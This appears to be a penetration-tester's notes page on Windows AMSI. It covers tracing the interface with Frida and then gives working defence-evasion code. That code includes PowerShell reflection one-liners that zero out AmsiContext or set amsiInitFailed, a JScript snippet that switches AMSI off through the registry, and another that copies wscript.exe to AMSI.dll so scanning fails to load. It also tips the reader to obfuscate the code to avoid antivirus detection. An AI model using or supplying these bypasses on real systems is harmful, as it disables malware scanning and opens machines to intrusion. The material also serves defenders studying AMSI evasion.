---
description: Anti Malware Scan Interface
---

# AMSI

AMSI is loaded into every PowerShell process and interacts with AV \(by default Windows Defender\). Exposed API:

* AmsiInitialize
* AmsiOpenSession
* AmsiScanString
* AmsiScanBuffer
* AmsiCloseSession

AmsiScanBuffer is used to check a buffer for malicious code. In case of ret = 32768, it is indeed malicious, ret = 1 means its clean.

### Tracing AMSI with Frida

Install Frida: Install python3 and then `pip install frida-tools` .

Trace AMSI \(open PowerShell, then run the following\):

```text
frida-trace -p <powershell pid> -x amsi.dll -i Amsi*    
```

When running a PowerShell command, we can see AmsiScanBuffer being called.  On startup, Frida creates handlers - we can edit these to modify the trace behavior. We can for example log the argument buffer:

```text
log('    amsiContext: ' + args[0]);
log('    buffer: ' + Memory.readUtf16String(args[1]));
```

### Bypass: Zero out AmsiContext

AmsiContext has a PTR to a buffer that starts with the string "AMSI", if we patch this string out, AMSI is disabled.

We can do this by using Reflection to get the pointer to AmsiContext and then write zero to the buffer:

```text
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like
"*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name
-like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf =
@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

Alternatively we can also set the "AmsiInitialize"-Field to null using the same technique \(to evade AV use the same technique as above to improve it\):

```text
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFai
led','NonPublic,Static').SetValue($null,$true)
```

### Bypass: Patch AMSI Instructions

{% embed url="https://gist.github.com/xct/b7bbe6e34c2f38ca5e297fc3cb44571b" %}

### AMSI and JScript

Each command is handled in just one session, where as with PowerShell each command has its own session. We can not access Win32 APIs from JScript so we need another way using the Registry:

```javascript
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try {
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable!=0){
    throw new Error(1, '');
}
} catch(e) {
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName,0,1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}
```

Alternativly we can copy/rename wscript.exe to AMSI.dll, causing AMSI loading to fail:

```javascript
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try {
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0){
        throw new Error(1, '');
    }
} catch(e) {
    filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName);
    WScript.Quit(1);
}
```

